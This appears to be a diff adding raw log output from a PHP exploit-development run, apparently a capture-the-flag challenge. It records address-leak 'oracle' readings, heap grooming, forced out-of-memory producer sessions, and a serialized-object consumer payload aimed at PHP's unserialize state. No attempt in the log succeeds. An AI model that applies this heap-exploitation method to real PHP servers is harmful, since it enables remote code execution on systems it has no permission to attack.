@@ -31,3 +31,61 @@
 [2026-10-22 00:20:31] staged consumer session sess_b002030bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
 [2026-10-22 00:20:31] consumer: t=0.3s len=6 FLAG=no
 [2026-10-22 00:20:31] consumer body:  <EOF>
+[2026-10-22 00:21:08] === round b1: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:21:08] baseline read: 5 children [53, 54, 56, 57, 499]
+[2026-10-22 00:21:08] staged producer session sess_a002108aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 00:21:08] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 00:21:08] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 00:21:08] ORACLE: child=57 &BG(unserialize).data=0xfa2f11afea78 d_chunk=0xfa2f0ea6a000
+[2026-10-22 00:21:08] groom payload built: 8192B, LG=0xfa2f0ea6b000
+[2026-10-22 00:21:08] staged consumer session sess_b002108bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-22 00:21:08] benign mode: dtor ptrs -> 0xfa2f11b02000, token poc|i:1;
+[2026-10-22 00:21:09] consumer: t=0.3s len=6 FLAG=no
+[2026-10-22 00:21:09] consumer body:  <EOF>
+[2026-10-22 00:21:09] benign post: d_chunk head =  groom_sig=False (expect 0000b0112ffa0000)
+[2026-10-22 00:22:10] === round d1: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:22:10] baseline read: 5 children [53, 54, 56, 499, 567]
+[2026-10-22 00:22:11] staged producer session sess_a002210aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 00:22:11] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 00:22:11] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 00:22:11] ORACLE: no {data-ptr, level=1} pair found in basic_globals
+[2026-10-22 00:22:29] === round d2: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:22:29] baseline read: 5 children [53, 54, 56, 499, 567]
+[2026-10-22 00:22:29] staged producer session sess_a002229aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-22 00:22:29] producer: t=0.1s oom_signature=True len=553
+[2026-10-22 00:22:29] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-22 00:22:29] ORACLE cand: pid=499 off=816 data=0xfa2f0ea6a000 level=1
+[2026-10-22 00:22:29] ORACLE: child=499 &BG(unserialize).data=0xfa2f11afea78 d_chunk=0xfa2f0ea6a000
+[2026-10-22 00:22:29] DIAG: chunk=0xfa2f0ea00000 map_off=520
+[2026-10-22 00:22:29] DIAG: d_chunk head: 38a0a60e2ffa000000d0a60e2ffa000000d0a60e2ffa000000000000000000000000000000000000010000000000000000100000000000000300000000000000
+[2026-10-22 00:22:29] DIAG: free runs (page,len): [(1, 511)]
+[2026-10-22 00:22:29] DIAG: d run page=106 free=True
+[2026-10-22 00:22:29] DIAG: 3-page best-fit candidates: [(1, 511)] -> smallest: (1, 511)
+[2026-10-22 00:23:51] === round p1: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:23:51] baseline read: 5 children [53, 54, 56, 499, 567]
+[2026-10-22 00:23:57] place: t=5.1s len=68693 tail=b'\n</script>\n</body>\n</html>\n\r\n0\r\n\r\n\n<EOF>'
+[2026-10-22 00:23:57] place: pid=53 groom-zstr hits: NOTFOUND
+[2026-10-22 00:23:57] place: pid=54 groom-zstr hits: NOTFOUND
+[2026-10-22 00:23:57] place: pid=56 groom-zstr hits: NOTFOUND
+[2026-10-22 00:23:57] place: pid=499 groom-zstr hits: NOTFOUND
+[2026-10-22 00:23:57] place: pid=567 groom-zstr hits: NOTFOUND
+[2026-10-22 00:23:57] place: pid=617 groom-zstr hits: NOTFOUND
+[2026-10-22 00:24:38] === round p2: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:24:39] baseline read: 6 children [53, 54, 56, 499, 567, 617]
+[2026-10-22 00:24:44] place: t=5.1s len=68693 tail=b'\n</script>\n</body>\n</html>\n\r\n0\r\n\r\n\n<EOF>'
+[2026-10-22 00:24:50] === round p3: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:24:50] baseline read: 6 children [53, 54, 56, 499, 567, 617]
+[2026-10-22 00:24:55] place: t=5.1s len=68693 tail=b'\n</script>\n</body>\n</html>\n\r\n0\r\n\r\n\n<EOF>'
+[2026-10-22 00:24:56] place: pid=53 groom hits: NONE
+[2026-10-22 00:24:56] place: pid=54 groom hits: NONE
+[2026-10-22 00:24:56] place: pid=56 groom hits: NONE
+[2026-10-22 00:24:56] place: pid=499 groom hits: NONE
+[2026-10-22 00:24:56] place: pid=567 groom hits: NONE
+[2026-10-22 00:24:56] place: pid=617 groom hits: NONE
+[2026-10-22 00:27:59] === round p4: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-22 00:27:59] baseline read: 5 children [53, 56, 499, 567, 617]
+[2026-10-22 00:27:59] place: t=0.4s len=6 tail=b'\n<EOF>'
+[2026-10-22 00:27:59] place: pid=53 d_chunk head=d08f97062ffa000006000000ffffffff (last=0xfa2f06978fd0) - no groom
+[2026-10-22 00:27:59] place: pid=56 d_chunk head=d08f97062ffa000006000000ffffffff (last=0xfa2f06978fd0) - no groom
+[2026-10-22 00:28:00] place: pid=567 d_chunk head=d08f97062ffa000006000000ffffffff (last=0xfa2f06978fd0) - no groom
+[2026-10-22 00:28:00] place: pid=617 d_chunk head=00000000000000000000000000000000 (last=0x0) - no groom
